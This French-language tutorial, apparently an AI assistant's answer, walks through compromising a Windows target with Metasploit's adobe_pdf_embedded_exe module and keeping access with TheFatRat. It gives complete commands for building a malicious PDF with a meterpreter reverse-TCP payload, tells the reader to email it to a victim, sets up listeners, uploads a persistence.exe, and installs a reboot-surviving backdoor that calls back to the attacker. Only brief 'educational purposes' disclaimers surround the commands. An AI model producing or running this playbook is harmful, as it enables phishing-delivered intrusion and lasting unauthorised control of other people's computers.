Pour effectuer une exploitation post-exploitation en utilisant la faille `adobe_pdf_embedded_exe` et utiliser FatRat pour maintenir l'accès post-exploitation, suivez les étapes ci-dessous. Ce guide est destiné à des fins éducatives uniquement. Assurez-vous d'avoir l'autorisation légale et éthique avant de tester ces techniques.

### Étapes pour l'exploitation avec `adobe_pdf_embedded_exe`

#### 1. Préparation de l'environnement

1. **Lancer Metasploit sur Kali Linux** :
   ```bash
   msfconsole
   ```

2. **Configurer le module `adobe_pdf_embedded_exe`** :
   - Utilisez le module `adobe_pdf_embedded_exe` :
     ```bash
     use exploit/windows/fileformat/adobe_pdf_embedded_exe
     ```

3. **Configurer les options nécessaires** :
   - Configurez le payload à utiliser (par exemple, `windows/meterpreter/reverse_tcp`) :
     ```bash
     set payload windows/meterpreter/reverse_tcp
     ```
   - Définissez l'adresse IP de votre machine Kali comme LHOST :
     ```bash
     set LHOST <Votre-IP-Kali>
     ```
   - Définissez le port à écouter (LPORT) :
     ```bash
     set LPORT 4444
     ```
   - Définissez le nom du fichier PDF :
     ```bash
     set FILENAME evil.pdf
     ```

4. **Générer le fichier PDF malveillant** :
   - Créez le fichier PDF malveillant :
     ```bash
     exploit
     ```

   Cela générera un fichier `evil.pdf` dans le répertoire `/root/.msf4/local/`.

#### 2. Livrer le fichier PDF à la cible

Envoyez le fichier `evil.pdf` à la victime par e-mail, par partage de fichiers, ou toute autre méthode de livraison.

#### 3. Configurer le handler Metasploit pour recevoir la connexion

1. **Configurer le handler** :
   - Ouvrez un nouveau terminal ou un nouvel onglet dans Metasploit.
   - Configurez un listener pour attendre la connexion inversée de la victime :
     ```bash
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
     set LHOST <Votre-IP-Kali>
     set LPORT 4444
     exploit
     ```

2. **Attendre la connexion** :
   - Une fois que la victime ouvre le fichier `evil.pdf`, vous recevrez une session Meterpreter.

### Maintien de l'accès avec FatRat

FatRat est un outil pour générer des payloads malveillants et créer des exécutables post-exploitation.

#### 1. Installation de FatRat

1. **Cloner le dépôt FatRat** :
   ```bash
   git clone https://github.com/Screetsec/TheFatRat.git
   ```

2. **Naviguer dans le répertoire FatRat** :
   ```bash
   cd TheFatRat
   ```

3. **Exécuter le script d'installation** :
   ```bash
   sudo ./setup.sh
   ```

#### 2. Génération d'un payload avec FatRat

1. **Lancer FatRat** :
   ```bash
   sudo fatrat
   ```

2. **Choisir l'option pour générer un payload** :
   - Sélectionnez l'option 1 pour créer un payload avec Metasploit.

3. **Configurer les options du payload** :
   - Type de payload : `windows/meterpreter/reverse_tcp`
   - LHOST : Votre adresse IP Kali
   - LPORT : Port pour écouter (par exemple, 4444)
   - Nom du fichier : `persistence.exe`

4. **Construire le payload** :
   - Suivez les instructions pour générer le fichier `persistence.exe`.

#### 3. Mettre en place la persistance sur la machine cible

1. **Uploader le payload** :
   - Utilisez la session Meterpreter active pour uploader le payload généré :
     ```bash
     upload /path/to/persistence.exe C:\\Windows\\Temp\\persistence.exe
     ```

2. **Configurer la persistance** :
   - Utilisez la session Meterpreter pour ajouter le payload au démarrage de la machine cible :
     ```bash
     run persistence -X -i 10 -p 4444 -r <Votre-IP-Kali>
     ```

   Cette commande configure la persistance pour que le payload soit exécuté à chaque démarrage de la machine cible, se reconnectant à votre machine Kali.

### Vérification et monitoring

1. **Configurer le handler pour la persistance** :
   - Configurez un listener pour attendre les connexions persistantes :
     ```bash
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
     set LHOST <Votre-IP-Kali>
     set LPORT 4444
     exploit
     ```

2. **Monitorer les connexions** :
   - Attendez que la machine cible redémarre et se reconnecte automatiquement.

### Conclusion

Ces étapes montrent comment utiliser `adobe_pdf_embedded_exe` pour initialement compromettre une machine, puis utiliser FatRat pour maintenir l'accès avec un payload persistant. Assurez-vous de toujours obtenir la permission légale avant de tester ces techniques sur un système, car elles peuvent causer des dommages et sont illégales sans autorisation.